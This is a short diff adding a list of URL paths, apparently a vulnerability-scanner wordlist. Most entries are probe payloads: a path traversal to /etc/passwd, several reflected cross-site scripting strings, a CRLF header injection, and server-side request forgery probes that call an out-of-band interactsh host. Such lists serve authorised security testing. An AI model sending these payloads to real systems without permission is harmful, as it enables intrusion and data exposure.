@@ -1,0 +1,16 @@
+/webadmin/clientlogin/?srid=&action=showdeny&url=
+/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152
+/free_time.cgi
+/wp-json/visualizer/v1/upload-data
+/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0
+/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>
+/queues
+/metrics?period=%22%3E%3Cimg/src/onerror=alert(document.domain)%3E
+/metrics/SanityChecksJob?period=%22%3E%3Cimg/src/onerror=alert(document.domain)%3E
+/metrics/ActiveStorage::PurgeJob?period=%22%3E%3Cimg/src/onerror=alert(document.domain)%3E
+/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23
+/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23
+/(download)/tmp/poc.txt
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
